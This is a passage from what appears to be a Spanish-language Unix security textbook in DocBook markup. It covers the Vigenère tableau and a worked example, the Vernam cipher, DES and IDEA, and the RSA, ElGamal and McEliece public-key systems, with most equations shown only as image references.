 align="char"><para>r</para></entry><entry 
 align="char"><para>s</para></entry><entry 
 align="char"><para>t</para></entry><entry 
 align="char"><para>u</para></entry><entry 
 align="char"><para>v</para></entry><entry 
 align="char"><para>w</para></entry><entry 
 align="char"><para>x</para></entry><entry 
 align="char"><para>y</para></entry><entry 
 align="char"><para>z</para></entry><entry 
 align="char"><para>a</para></entry><entry 
 align="char"><para>b</para></entry><entry 
 align="char"><para>c</para></entry><entry 
 align="char"><para>d</para></entry><entry 
 align="char"><para>e</para></entry><entry 
 align="char"><para>f</para></entry><entry 
 align="char"><para>g</para></entry><entry 
 align="char"><para>h</para></entry><entry 
 align="char"><para>i</para></entry><entry 
 align="char"><para>j</para></entry><entry 
 align="char"><para>k</para></entry><entry 
 align="char"><para>l</para></entry><entry 
 align="char"><para>m</para></entry><entry 
 align="char"><para>n</para></entry><entry 
 align="char"><para>o</para></entry><entry 
 align="char"><para>p</para></entry><entry 
 align="char"><para>q</para></entry>
</row><row><entry 
 align="char"><para>S</para></entry><entry 
 align="char"><para>s</para></entry><entry 
 align="char"><para>t</para></entry><entry 
 align="char"><para>u</para></entry><entry 
 align="char"><para>v</para></entry><entry 
 align="char"><para>w</para></entry><entry 
 align="char"><para>x</para></entry><entry 
 align="char"><para>y</para></entry><entry 
 align="char"><para>z</para></entry><entry 
 align="char"><para>a</para></entry><entry 
 align="char"><para>b</para></entry><entry 
 align="char"><para>c</para></entry><entry 
 align="char"><para>d</para></entry><entry 
 align="char"><para>e</para></entry><entry 
 align="char"><para>f</para></entry><entry 
 align="char"><para>g</para></entry><entry 
 align="char"><para>h</para></entry><entry 
 align="char"><para>i</para></entry><entry 
 align="char"><para>j</para></entry><entry 
 align="char"><para>k</para></entry><entry 
 align="char"><para>l</para></entry><entry 
 align="char"><para>m</para></entry><entry 
 align="char"><para>n</para></entry><entry 
 align="char"><para>o</para></entry><entry 
 align="char"><para>p</para></entry><entry 
 align="char"><para>q</para></entry><entry 
 align="char"><para>r</para></entry>
</row><row><entry 
 align="char"><para>T</para></entry><entry 
 align="char"><para>t</para></entry><entry 
 align="char"><para>u</para></entry><entry 
 align="char"><para>v</para></entry><entry 
 align="char"><para>w</para></entry><entry 
 align="char"><para>x</para></entry><entry 
 align="char"><para>y</para></entry><entry 
 align="char"><para>z</para></entry><entry 
 align="char"><para>a</para></entry><entry 
 align="char"><para>b</para></entry><entry 
 align="char"><para>c</para></entry><entry 
 align="char"><para>d</para></entry><entry 
 align="char"><para>e</para></entry><entry 
 align="char"><para>f</para></entry><entry 
 align="char"><para>g</para></entry><entry 
 align="char"><para>h</para></entry><entry 
 align="char"><para>i</para></entry><entry 
 align="char"><para>j</para></entry><entry 
 align="char"><para>k</para></entry><entry 
 align="char"><para>l</para></entry><entry 
 align="char"><para>m</para></entry><entry 
 align="char"><para>n</para></entry><entry 
 align="char"><para>o</para></entry><entry 
 align="char"><para>p</para></entry><entry 
 align="char"><para>q</para></entry><entry 
 align="char"><para>r</para></entry><entry 
 align="char"><para>s</para></entry>
</row><row><entry 
 align="char"><para>U</para></entry><entry 
 align="char"><para>u</para></entry><entry 
 align="char"><para>v</para></entry><entry 
 align="char"><para>w</para></entry><entry 
 align="char"><para>x</para></entry><entry 
 align="char"><para>y</para></entry><entry 
 align="char"><para>z</para></entry><entry 
 align="char"><para>a</para></entry><entry 
 align="char"><para>b</para></entry><entry 
 align="char"><para>c</para></entry><entry 
 align="char"><para>d</para></entry><entry 
 align="char"><para>e</para></entry><entry 
 align="char"><para>f</para></entry><entry 
 align="char"><para>g</para></entry><entry 
 align="char"><para>h</para></entry><entry 
 align="char"><para>i</para></entry><entry 
 align="char"><para>j</para></entry><entry 
 align="char"><para>k</para></entry><entry 
 align="char"><para>l</para></entry><entry 
 align="char"><para>m</para></entry><entry 
 align="char"><para>n</para></entry><entry 
 align="char"><para>o</para></entry><entry 
 align="char"><para>p</para></entry><entry 
 align="char"><para>q</para></entry><entry 
 align="char"><para>r</para></entry><entry 
 align="char"><para>s</para></entry><entry 
 align="char"><para>t</para></entry>
</row><row><entry 
 align="char"><para>V</para></entry><entry 
 align="char"><para>v</para></entry><entry 
 align="char"><para>w</para></entry><entry 
 align="char"><para>x</para></entry><entry 
 align="char"><para>y</para></entry><entry 
 align="char"><para>z</para></entry><entry 
 align="char"><para>a</para></entry><entry 
 align="char"><para>b</para></entry><entry 
 align="char"><para>c</para></entry><entry 
 align="char"><para>d</para></entry><entry 
 align="char"><para>e</para></entry><entry 
 align="char"><para>f</para></entry><entry 
 align="char"><para>g</para></entry><entry 
 align="char"><para>h</para></entry><entry 
 align="char"><para>i</para></entry><entry 
 align="char"><para>j</para></entry><entry 
 align="char"><para>k</para></entry><entry 
 align="char"><para>l</para></entry><entry 
 align="char"><para>m</para></entry><entry 
 align="char"><para>n</para></entry><entry 
 align="char"><para>o</para></entry><entry 
 align="char"><para>p</para></entry><entry 
 align="char"><para>q</para></entry><entry 
 align="char"><para>r</para></entry><entry 
 align="char"><para>s</para></entry><entry 
 align="char"><para>t</para></entry><entry 
 align="char"><para>u</para></entry>
</row><row><entry 
 align="char"><para>W</para></entry><entry 
 align="char"><para>w</para></entry><entry 
 align="char"><para>x</para></entry><entry 
 align="char"><para>y</para></entry><entry 
 align="char"><para>z</para></entry><entry 
 align="char"><para>a</para></entry><entry 
 align="char"><para>b</para></entry><entry 
 align="char"><para>c</para></entry><entry 
 align="char"><para>d</para></entry><entry 
 align="char"><para>e</para></entry><entry 
 align="char"><para>f</para></entry><entry 
 align="char"><para>g</para></entry><entry 
 align="char"><para>h</para></entry><entry 
 align="char"><para>i</para></entry><entry 
 align="char"><para>j</para></entry><entry 
 align="char"><para>k</para></entry><entry 
 align="char"><para>l</para></entry><entry 
 align="char"><para>m</para></entry><entry 
 align="char"><para>n</para></entry><entry 
 align="char"><para>o</para></entry><entry 
 align="char"><para>p</para></entry><entry 
 align="char"><para>q</para></entry><entry 
 align="char"><para>r</para></entry><entry 
 align="char"><para>s</para></entry><entry 
 align="char"><para>t</para></entry><entry 
 align="char"><para>u</para></entry><entry 
 align="char"><para>v</para></entry>
</row><row><entry 
 align="char"><para>X</para></entry><entry 
 align="char"><para>x</para></entry><entry 
 align="char"><para>y</para></entry><entry 
 align="char"><para>z</para></entry><entry 
 align="char"><para>a</para></entry><entry 
 align="char"><para>b</para></entry><entry 
 align="char"><para>c</para></entry><entry 
 align="char"><para>d</para></entry><entry 
 align="char"><para>e</para></entry><entry 
 align="char"><para>f</para></entry><entry 
 align="char"><para>g</para></entry><entry 
 align="char"><para>h</para></entry><entry 
 align="char"><para>i</para></entry><entry 
 align="char"><para>j</para></entry><entry 
 align="char"><para>k</para></entry><entry 
 align="char"><para>l</para></entry><entry 
 align="char"><para>m</para></entry><entry 
 align="char"><para>n</para></entry><entry 
 align="char"><para>o</para></entry><entry 
 align="char"><para>p</para></entry><entry 
 align="char"><para>q</para></entry><entry 
 align="char"><para>r</para></entry><entry 
 align="char"><para>s</para></entry><entry 
 align="char"><para>t</para></entry><entry 
 align="char"><para>u</para></entry><entry 
 align="char"><para>v</para></entry><entry 
 align="char"><para>w</para></entry>
</row><row><entry 
 align="char"><para>Y</para></entry><entry 
 align="char"><para>y</para></entry><entry 
 align="char"><para>z</para></entry><entry 
 align="char"><para>a</para></entry><entry 
 align="char"><para>b</para></entry><entry 
 align="char"><para>c</para></entry><entry 
 align="char"><para>d</para></entry><entry 
 align="char"><para>e</para></entry><entry 
 align="char"><para>f</para></entry><entry 
 align="char"><para>g</para></entry><entry 
 align="char"><para>h</para></entry><entry 
 align="char"><para>i</para></entry><entry 
 align="char"><para>j</para></entry><entry 
 align="char"><para>k</para></entry><entry 
 align="char"><para>l</para></entry><entry 
 align="char"><para>m</para></entry><entry 
 align="char"><para>n</para></entry><entry 
 align="char"><para>o</para></entry><entry 
 align="char"><para>p</para></entry><entry 
 align="char"><para>q</para></entry><entry 
 align="char"><para>r</para></entry><entry 
 align="char"><para>s</para></entry><entry 
 align="char"><para>t</para></entry><entry 
 align="char"><para>u</para></entry><entry 
 align="char"><para>v</para></entry><entry 
 align="char"><para>w</para></entry><entry 
 align="char"><para>x</para></entry>
</row><row><entry 
 align="char"><para>Z</para></entry><entry 
 align="char"><para>z</para></entry><entry 
 align="char"><para>a</para></entry><entry 
 align="char"><para>b</para></entry><entry 
 align="char"><para>c</para></entry><entry 
 align="char"><para>d</para></entry><entry 
 align="char"><para>e</para></entry><entry 
 align="char"><para>f</para></entry><entry 
 align="char"><para>g</para></entry><entry 
 align="char"><para>h</para></entry><entry 
 align="char"><para>i</para></entry><entry 
 align="char"><para>j</para></entry><entry 
 align="char"><para>k</para></entry><entry 
 align="char"><para>l</para></entry><entry 
 align="char"><para>m</para></entry><entry 
 align="char"><para>n</para></entry><entry 
 align="char"><para>o</para></entry><entry 
 align="char"><para>p</para></entry><entry 
 align="char"><para>q</para></entry><entry 
 align="char"><para>r</para></entry><entry 
 align="char"><para>s</para></entry><entry 
 align="char"><para>t</para></entry><entry 
 align="char"><para>u</para></entry><entry 
 align="char"><para>v</para></entry><entry 
 align="char"><para>w</para></entry><entry 
 align="char"><para>x</para></entry><entry 
 align="char"><para>y</para></entry>
</row><row><entry 
 align="char"><para> </para></entry>
</row></tbody></tgroup></informaltable>
<blockquote role="caption"><title role="caption"><anchor 
   id="x1-3130011"  ></anchor>Cuadro&#x00A0;20.1</title><para>Tableau Vig&#x00E8;nere</para></blockquote>
</section>

<!--l. 449--><para>  La clave del sistema de cifrado de Vigen&#x00E8;re es una palabra de <informalequation><graphic 
fileref="unixsec414x.gif"></graphic></informalequation> letras, <informalequation><graphic 
fileref="unixsec415x.gif"></graphic></informalequation>, del alfabeto <informalequation><graphic 
fileref="unixsec416x.gif"></graphic></informalequation> utilizado
anteriormente; esta palabra es un elemento del producto cartesiano <informalequation><graphic 
fileref="unixsec417x.gif"></graphic></informalequation> (<informalequation><graphic 
fileref="unixsec418x.gif"></graphic></informalequation>
veces), que es justamente el alfabeto del criptosistema de Vigen&#x00E8;re. De esta forma, el mensaje
a cifrar en texto claro ha de descomponerse en bloques de <informalequation><graphic 
fileref="unixsec419x.gif"></graphic></informalequation> elementos &#x2013; letras &#x2013; y aplicar
sucesivamente la clave empleada a cada uno de estos bloques, utilizando la tabla anteriormente
proporcionada.
<!--br/-->
<!--br/-->Veamos un ejemplo de aplicaci&#x00F3;n del criptosistema de Vigen&#x00E8;re: queremos codi&#xFB01;car la frase La
abrumadora soledad del programador utilizando la clave prueba. En primer lugar, nos &#xFB01;jamos en la
longitud de la clave: es de seis caracteres, por lo que descomponemos la frase en bloques de
longitud seis; aunque el &#x00FA;ltimo bloque es de longitud tres, esto no afecta para nada al proceso de
cifrado:
</para><section role="center"><title/>
<!--l. 465--><para> laabru madora soleda ddelpr ograma dor</para></section>
<!--l. 469--><para>Ahora, aplicamos a cada bloque la clave prueba y buscamos los resultados como entradas de la tabla de
Vigen&#x00E8;re:

     </para><literallayout role="verbatim">
&#x00A0;laabru&#x00A0;&#x00A0;&#x00A0;&#x00A0;madora&#x00A0;&#x00A0;&#x00A0;soleda&#x00A0;&#x00A0;&#x00A0;&#x00A0;ddelpr&#x00A0;&#x00A0;&#x00A0;&#x00A0;ograma&#x00A0;&#x00A0;&#x00A0;dor
&#x00A0;prueba&#x00A0;&#x00A0;&#x00A0;&#x00A0;prueba&#x00A0;&#x00A0;&#x00A0;prueba&#x00A0;&#x00A0;&#x00A0;&#x00A0;prueba&#x00A0;&#x00A0;&#x00A0;&#x00A0;prueba&#x00A0;&#x00A0;&#x00A0;pru
&#x00A0;arufsu&#x00A0;&#x00A0;&#x00A0;&#x00A0;brxhsa&#x00A0;&#x00A0;&#x00A0;igfiea&#x00A0;&#x00A0;&#x00A0;&#x00A0;suyoqr&#x00A0;&#x00A0;&#x00A0;&#x00A0;exmena&#x00A0;&#x00A0;&#x00A0;sgm
</literallayout>
<!--l. 478--><para>Por ejemplo, la primera &#x2018;a&#x2019; del texto cifrado corresponde a la entrada <informalequation><graphic 
fileref="unixsec420x.gif"></graphic></informalequation>, o, equivalentemente, <informalequation><graphic 
fileref="unixsec421x.gif"></graphic></informalequation> de la
tabla de Vigen&#x00E8;re. Finalmente, vemos que el texto cifrado ha quedado arufsu brxhsa ig&#xFB01;ea suyoqr exmena
sgm.
<!--br/-->
<!--br/-->Este m&#x00E9;todo de cifrado polialfab&#x00E9;tico se consideraba invulnerable hasta que en el S.XIX se consiguieron
descifrar algunos mensajes codi&#xFB01;cados con este sistema, mediante el estudio de la repetici&#x00F3;n de bloques de
letras: la distancia entre un bloque y su repetici&#x00F3;n suele ser m&#x00FA;ltiplo de la palabra tomada como
clave.
<!--br/-->
<!--br/-->Una mejora sobre el cifrado de Vigen&#x00E8;re fu&#x00E9; introducida por el sistema de Vernam, utilizando una clave
aleatoria de longitud <informalequation><graphic 
fileref="unixsec422x.gif"></graphic></informalequation> igual a la del mensaje; la con&#xFB01;anza en este nuevo criptosistema hizo que se utilizase
en las comunciaciones con&#xFB01;denciales entre la Casa Blanca y el Kremlin, hasta, por lo menos, el a~no
1987.
  </para></section><!--end subsection--></section><!--end section--><!--l. 492--><section 
role="section"><title><abbrev role="title-mark">20.6</abbrev><anchor 
   id="x1-31400020.6"  ></anchor>Un criptosistema de clave secreta: DES</title>
<!--l. 493--><para>  El DEA (Data Encryption Algorithm) o DES (Data Encryption Standard) es desde 1977 de uso
obligatorio en el cifrado de informaciones gubernamentales no clasi&#xFB01;cadas (anunciado por el National
Bureau of Standards, USA). Este criptosistema fue desarrollado por IBM como una variaci&#x00F3;n de un
criptosistema anterior, Lucifer, y posteriormente, tras algunas comprobaciones llevadas a cabo por la
NSA estadounidense, pas&#x00F3; a transformarse en el que hoy conocemos como DES. DES puede ser
implementado tanto en software como en chips con tecnolog&#x02CA;&#x0131;a VLSI (Very Large Scale Integration),
alcanzando en hardware una velocidad de hasta 50 Mbs. Un ejemplo de implantaci&#x00F3;n hard puede ser
PC-Encryptor, de Eracom, y un ejemplo de implantaci&#x00F3;n en software es DES-LOCK, de la empresa
Oceanics.
<!--br/-->
<!--br/-->DES es un sistema de clave privada tanto de cifrado como de descifrado; posee una clave de entrada con
una longitud de 64 bits, produciendo una salida tambi&#x00E9;n de 64 bits, con una clave de 56 bits (el octavo bit
de cada byte es de paridad), llamada clave externa, en la que reside toda la seguridad del criptosistema ya
que el algoritmo es de dominio p&#x00FA;blico. Cada trozo de 64 bits de los datos se desordena seg&#x00FA;n un esquema
&#xFB01;jo a partir de una permutaci&#x00F3;n inicial conocida como IP. A continuaci&#x00F3;n, se divide cada uno de los trozos
en dos mitades de 32 bits, que se someten a un algoritmo durante 16 iteraciones. Este algoritmo b&#x00E1;sico
que se repite 16 veces (llamadas vueltas), utiliza en cada una de ellas 48 de los 56 bits de la
clave (estos 48 bits se denominan clave interna, diferente en cada vuelta); las claves internas
se utilizan en un orden para cifrar texto (llamemoslas <informalequation><graphic 
fileref="unixsec423x.gif"></graphic></informalequation>) y en el orden inverso
(<informalequation><graphic 
fileref="unixsec424x.gif"></graphic></informalequation>) para descifrarlo. En cada una de las vueltas se realizan permutaciones, sustituciones no
lineales (que constituyen en s&#x02CA;&#x0131; el n&#x00FA;cleo del algoritmo DES) y operaciones l&#x00F3;gicas b&#x00E1;sicas, como
la XOR. La mitad derecha se trans&#xFB01;ere a la mitad izquierda sin ning&#x00FA;n cambio; tambi&#x00E9;n se
expande de 32 hasta 48 bits, utilizando para ello una simple duplicaci&#x00F3;n. El resultado &#xFB01;nal de
una iteraci&#x00F3;n es un XOR con la clave interna de la vuelta correspondiente, y esta salida se
divide en bloques de 6 bits, cada uno de los cuales se somete a una sustituci&#x00F3;n en un bloque
de 4 bits (bloque-S, con un rango 0...63) dando una salida tambi&#x00E9;n de 4 bits (rango decimal
0...15) que a su vez se recombina con una permutaci&#x00F3;n en un registro con longitud 32 bits. Con
el contenido de este registro se efectua una operaci&#x00F3;n XOR sobre la mitad izquierda de los
datos originales, convirti&#x00E9;ndose el nuevo resultado en una salida (parte derecha) de 32 bits;
transcurridas las dieciseis vueltas, las dos mitades &#xFB01;nales (de 32 bits cada una) se recombinan con una
permutaci&#x00F3;n contraria a la realizada al principio (IP), y el resultado es un criptograma de 64
bits.

<!--br/-->
<!--br/-->Aunque no ha sido posible demostrar rigurosamente la debilidad del criptosistema DES, y actualmente es
uno de los m&#x00E1;s utilizados en el mundo entero, parece claro que con las actuales computadoras y su elevada
potencia de c&#x00E1;lculo una clave de 56 bits (en la que recordemos, reside toda la seguridad del DES) es
f&#x00E1;cilmente vulnerable frente a un ataque exhaustivo en el que se prueben combinaciones de
esos 56 bits. Hay que resaltar que el tama~no inicial de la clave, en el dise~no de IBM, era de
128 bits; la raz&#x00F3;n de la disminuci&#x00F3;n no se ha hecho p&#x00FA;blica hasta el momento. Por si esto fuera
poco, otro factor que ha aumentado las controversias y discusiones acerca de la seguridad
de DES son dos propiedades del algoritmo: la propiedad de complementaci&#x00F3;n, que reduce el
tiempo necesario para un ataque exhaustivo, y la propiedad de las claves d&#x00E9;biles, dada cuando el
proceso de cifrado es id&#x00E9;ntico al de descifrado (<informalequation><graphic 
fileref="unixsec425x.gif"></graphic></informalequation>), que sucede con
cuatro claves del criptosistema. Otro secreto de IBM (a instancias de la NSA) es la elecci&#x00F3;n y
dise~no de las cajas que DES utiliza para el cifrado; no se puede evitar el pensar que el gobierno
estadounidense precise un criptosistema con la robustez necesaria para que nadie, excepto ellos, pueda
descifrarlo.
<!--br/-->
<!--br/-->A la vista de estos hechos, la idea de que DES no va a seguir siendo el algoritmo de cifrado est&#x00E1;ndar en las
instituciones estadounidenses se va generalizando poco a poco; por tanto, va a ser necesario sustituirlo por
otro algoritmo m&#x00E1;s robusto frente a los ataques. Siguiendo esta l&#x02CA;&#x0131;nea, Xuejia Lai y James Massey, dos
prestigiosos cript&#x00F3;grafos, desarrollaron a &#xFB01;nales de la d&#x00E9;cada de los ochenta el algoritmo IDEA
(International Data Encryption Algorithm), compatible con DES (para aprovechar el gran
n&#x00FA;mero de equipos que utilizan este algoritmo), y con una robustez garantizada por la clave
de 128 bits que utiliza este cifrador de bloques y las complejas operaciones utilizadas para
evitar el &#x00E9;xito de un posible atacante, que van desde t&#x00E9;cnicas de difusi&#x00F3;n hasta adiciones m&#x00F3;dulo
<informalequation><graphic 
fileref="unixsec426x.gif"></graphic></informalequation>.
<!--br/-->
<!--br/-->El algoritmo IDEA est&#x00E1; siendo ampliamente aceptado en diversas aplicaciones inform&#x00E1;ticas orientadas a la
seguridad de los datos; numerosos programas destinados a trabajar en red utilizan ya este algoritmo como
el principal de cifrado.
  </para></section><!--end section--><!--l. 574--><section 
role="section"><title><abbrev role="title-mark">20.7</abbrev><anchor 
   id="x1-31500020.7"  ></anchor>Criptosistemas de clave p&#x00FA;blica</title>
<!--l. 575--><para>
  </para><!--l. 575--><section 
role="subsection"><title><abbrev role="title-mark">20.7.1</abbrev><anchor 
   id="x1-31600020.7.1"  ></anchor>El criptosistema RSA</title>
<!--l. 576--><para>  Este sistema de clave p&#x00FA;blica fu&#x00E9; dise~nado en 1977 por los profesores del MIT (Massachusetts Institute of
Technology) Ronald R. Rivest, Adi Shamir y Leonard M. Adleman, de ah&#x02CA;&#x0131; las siglas con las que es
conocido. Desde entonces, este algoritmo de cifrado se ha convertido en el prototipo de los de clave
p&#x00FA;blica.
<!--br/-->
<!--br/-->La seguridad de RSA radica en la di&#xFB01;cultad de la factorizaci&#x00F3;n de n&#x00FA;meros grandes: es f&#x00E1;cil saber si un n&#x00FA;mero
es primo, pero es extremadamente dif&#x02CA;&#x0131;cil obtener la factorizaci&#x00F3;n en n&#x00FA;meros primos de un entero elevado,
debido no a la di&#xFB01;cultad de los algoritmos existentes, sino al consumo de recursos f&#x02CA;&#x0131;sicos (memoria,
necesidades hardware&#x2026;incluso tiempo de ejecuci&#x00F3;n) de tales algoritmos. Se ha demostrado que si n es el
n&#x00FA;mero de d&#x02CA;&#x0131;gitos binarios de la entrada de cualquier algoritmo de factorizaci&#x00F3;n, el coste del algoritmo
es <informalequation><graphic 
fileref="unixsec427x.gif"></graphic></informalequation>, con un tiempo de ejecuci&#x00F3;n perteneciente a la categor&#x02CA;&#x0131;a de los llamados problemas
intratables.
<!--br/-->
<!--br/-->Veamos el funcionamiento del algoritmo RSA: si un usuario A desea enviar informaci&#x00F3;n cifrada, en primer
lugar tiene que calcular un par de claves (p&#x00FA;blica y privada), para lo que ha de elegir aleatoriamente dos
n&#x00FA;meros primos grandes (del orden de cien d&#x02CA;&#x0131;gitos), <informalequation><graphic 
fileref="unixsec428x.gif"></graphic></informalequation> y <informalequation><graphic 
fileref="unixsec429x.gif"></graphic></informalequation>, n&#x00FA;meros que se han de mantener en secreto; si
llamamos <informalequation><graphic 
fileref="unixsec430x.gif"></graphic></informalequation> (<informalequation><graphic 
fileref="unixsec431x.gif"></graphic></informalequation> se conoce como m&#x00F3;dulo) al producto <informalequation><graphic 
fileref="unixsec432x.gif"></graphic></informalequation>, el usuario ha de determinar otro entero, <informalequation><graphic 
fileref="unixsec433x.gif"></graphic></informalequation>,
llamado exponente privado, que cumpla
</para><section role="center"><title/>

<!--l. 598--><para> <informalequation><graphic 
fileref="unixsec434x.gif"></graphic></informalequation></para></section>
<!--l. 601--><para>es decir, <informalequation><graphic 
fileref="unixsec435x.gif"></graphic></informalequation> y el producto <informalequation><graphic 
fileref="unixsec436x.gif"></graphic></informalequation>, que llamaremos funci&#x00F3;n de Euler y denotaremos <informalequation><graphic 
fileref="unixsec437x.gif"></graphic></informalequation>, han de ser
primos. Con estos datos, ya tenemos la clave privada del cifrado: el par <informalequation><graphic 
fileref="unixsec438x.gif"></graphic></informalequation>; para obtener la
clave p&#x00FA;blica, hallamos el inverso multiplicativo del n&#x00FA;mero <informalequation><graphic 
fileref="unixsec439x.gif"></graphic></informalequation> respecto de <informalequation><graphic 
fileref="unixsec440x.gif"></graphic></informalequation>, de la forma
<informalequation><graphic 
fileref="unixsec441x.gif"></graphic></informalequation>. Calculado este entero <informalequation><graphic 
fileref="unixsec442x.gif"></graphic></informalequation>, llamado exponente p&#x00FA;blico, la clave p&#x00FA;blica ser&#x00E1; el par
<informalequation><graphic 
fileref="unixsec443x.gif"></graphic></informalequation>.
<!--br/-->
<!--br/-->Una vez el emisor A dispone de sus claves p&#x00FA;blica y privada, podr&#x02CA;&#x0131;a enviar un mensaje cifrado, que
llamaremos <informalequation><graphic 
fileref="unixsec444x.gif"></graphic></informalequation>, a un posible receptor, mediante la operaci&#x00F3;n
</para><section role="center"><title/>
<!--l. 611--><para> <informalequation><graphic 
fileref="unixsec445x.gif"></graphic></informalequation></para></section>
<!--l. 614--><para>aplicada a cada elemento del mensaje.
<!--br/-->
<!--br/-->Cuando el receptor del criptograma desee descifrar el mensaje recibido, ha de realizar la operaci&#x00F3;n
</para><section role="center"><title/>
<!--l. 617--><para> <informalequation><graphic 
fileref="unixsec446x.gif"></graphic></informalequation></para></section>
<!--l. 620--><para>para obtener el texto en claro del mensaje que acaba de recibir.
<!--br/-->
<!--br/-->El sistema RSA ha permanecido invulnerable hasta hoy, a pesar de los numerosos ataques de
criptoanalistas; te&#x00F3;ricamente es posible despejar <informalequation><graphic 
fileref="unixsec447x.gif"></graphic></informalequation> para obtener la clave privada, a partir de la funci&#x00F3;n de
descifrado, resultando
</para><section role="center"><title/>
<!--l. 625--><para> <informalequation><graphic 
fileref="unixsec448x.gif"></graphic></informalequation></para></section>
<!--l. 628--><para>Sin embargo, el c&#x00E1;lculo de logaritmos discretos es un problema de una complejidad desbordante, por lo que
este tipo de ataque se vuelve impracticable: la resoluci&#x00F3;n de congruencias del tipo <informalequation><graphic 
fileref="unixsec449x.gif"></graphic></informalequation>, necesarias
para descifrar el mensaje, es algor&#x02CA;&#x0131;tmicamente inviable sin ninguna informaci&#x00F3;n adicional, debido al elevado
tiempo de ejecuci&#x00F3;n del algoritmo. Aunque cuando los factores de <informalequation><graphic 
fileref="unixsec450x.gif"></graphic></informalequation> son peque~nos existe un algoritmo,
desarrollado por Pohlig y Hellman de orden <informalequation><graphic 
fileref="unixsec451x.gif"></graphic></informalequation>, &#x00E9;ste es otro de los algoritmos catalogados como
intratables, vistos anteriormente.
  </para></section><!--end subsection--><!--l. 637--><section 
role="subsection"><title><abbrev role="title-mark">20.7.2</abbrev><anchor 
   id="x1-31700020.7.2"  ></anchor>El criptosistema de ElGamal</title>
<!--l. 638--><para>  Durante 1984 y 1985 ElGamal desarroll&#x00F3; un nuevo criptosistema de clave p&#x00FA;blica basado en la
intratabilidad computacional del problema del logaritmo discreto: obtener el valor de <informalequation><graphic 
fileref="unixsec452x.gif"></graphic></informalequation> a partir de la
expresi&#x00F3;n
</para><section role="center"><title/>
<!--l. 641--><para> <informalequation><graphic 
fileref="unixsec453x.gif"></graphic></informalequation></para></section>
<!--l. 644--><para>es, como hemos comentado para RSA, computacionalemente intratable por norma general.
<!--br/-->
<!--br/-->Aunque generalmente no se utiliza de forma directa, ya que la velocidad de cifrado y autenticaci&#x00F3;n es
inferior a la obtenida con RSA, y adem&#x00E1;s las &#xFB01;rmas producidas son m&#x00E1;s largas (&#x00A1;el doble de largo
que el texto original!), el algoritmo de ElGamal es de gran importancia en el desarrollo del
DSS (Digital Signature Standard), del NIST (National Institute of Standards and Technology)
estadounidense.
<!--br/-->
<!--br/-->En este sistema, para generar un par clave p&#x00FA;blica/privada, se escoge un n&#x00FA;mero primo grande, <informalequation><graphic 
fileref="unixsec454x.gif"></graphic></informalequation>, y dos
enteros <informalequation><graphic 
fileref="unixsec455x.gif"></graphic></informalequation> y <informalequation><graphic 
fileref="unixsec456x.gif"></graphic></informalequation>, <informalequation><graphic 
fileref="unixsec457x.gif"></graphic></informalequation>, <informalequation><graphic 
fileref="unixsec458x.gif"></graphic></informalequation>, y se calcula

</para><section role="center"><title/>
<!--l. 655--><para> <informalequation><graphic 
fileref="unixsec459x.gif"></graphic></informalequation></para></section>
<!--l. 658--><para>La clave p&#x00FA;blica ser&#x00E1; el n&#x00FA;mero <informalequation><graphic 
fileref="unixsec460x.gif"></graphic></informalequation>, y la privada el n&#x00FA;mero <informalequation><graphic 
fileref="unixsec461x.gif"></graphic></informalequation>.
<!--br/-->
<!--br/-->Para &#xFB01;rmar un determinado mensaje, el emisor elige un entero aleatorio <informalequation><graphic 
fileref="unixsec462x.gif"></graphic></informalequation>, <informalequation><graphic 
fileref="unixsec463x.gif"></graphic></informalequation>, no usado con
anterioridad y con la restricci&#x00F3;n que <informalequation><graphic 
fileref="unixsec464x.gif"></graphic></informalequation> sea relativamente primo a <informalequation><graphic 
fileref="unixsec465x.gif"></graphic></informalequation>, y computa
     </para><!--l. 663--><para><informalequation><graphic 
fileref="unixsec466x.gif"></graphic></informalequation>
     <!--br/--><informalequation><graphic 
fileref="unixsec467x.gif"></graphic></informalequation>,
</para><!--l. 666--><para>donde <informalequation><graphic 
fileref="unixsec468x.gif"></graphic></informalequation> es el inverso de <informalequation><graphic 
fileref="unixsec469x.gif"></graphic></informalequation>; as&#x02CA;&#x0131;,
</para><section role="center"><title/>
<!--l. 667--><para> <informalequation><graphic 
fileref="unixsec470x.gif"></graphic></informalequation>.</para></section>
<!--l. 670--><para>La &#xFB01;rma del mensaje estar&#x00E1; entonces formada por <informalequation><graphic 
fileref="unixsec471x.gif"></graphic></informalequation> y <informalequation><graphic 
fileref="unixsec472x.gif"></graphic></informalequation>; un potencial receptor puede usar la clave p&#x00FA;blica y
para calcular <informalequation><graphic 
fileref="unixsec473x.gif"></graphic></informalequation> y comprobar si coincide con <informalequation><graphic 
fileref="unixsec474x.gif"></graphic></informalequation>:
</para><section role="center"><title/>
<!--l. 673--><para> <informalequation><graphic 
fileref="unixsec475x.gif"></graphic></informalequation></para></section>
<!--l. 676--><para>El criptosistema de ElGamal tiene una caracter&#x02CA;&#x0131;stica determinante que lo distingue del resto de sistemas de
clave p&#x00FA;blica: en el cifrado se utiliza aparte de la clave p&#x00FA;blica del receptor, la clave privada del
emisor.
  </para></section><!--end subsection--><!--l. 680--><section 
role="subsection"><title><abbrev role="title-mark">20.7.3</abbrev><anchor 
   id="x1-31800020.7.3"  ></anchor>Criptosistema de McEliece</title>
<!--l. 681--><para>  En 1978 McEliece present&#x00F3; un nuevo criptosistema de clave p&#x00FA;blica, basado en la Teor&#x02CA;&#x0131;a de la Codi&#xFB01;caci&#x00F3;n
algebraica. Dado que esta teor&#x02CA;&#x0131;a es muy compleja, los expertos recomiendan una familiarizaci&#x00F3;n
matem&#x00E1;tica preliminar con la Teor&#x02CA;&#x0131;a de la Codi&#xFB01;caci&#x00F3;n, los C&#x00F3;digos de Goppa, y los Cuerpos de
Galois.
<!--br/-->
<!--br/-->En el sistema de McEliece, cada usuario ha de elegir un polinomio irreducible de grado <informalequation><graphic 
fileref="unixsec476x.gif"></graphic></informalequation>, y construir una
matriz generadora del correspondiente c&#x00F3;digo de Goppa, matriz <informalequation><graphic 
fileref="unixsec477x.gif"></graphic></informalequation>, de orden <informalequation><graphic 
fileref="unixsec478x.gif"></graphic></informalequation>. Tambi&#x00E9;n ha de
calcular <informalequation><graphic 
fileref="unixsec479x.gif"></graphic></informalequation>, matriz generadora de c&#x00F3;digo lineal tal que no exista un algoritmo computable que
corrija los errores con &#x00E9;ste c&#x00F3;digo en un tiempo peque~no; esta matriz es obtenida a partir de la
expresi&#x00F3;n
</para><section role="center"><title/>
<!--l. 693--><para> <informalequation><graphic 
fileref="unixsec480x.gif"></graphic></informalequation></para></section>
<!--l. 696--><para>con <informalequation><graphic 
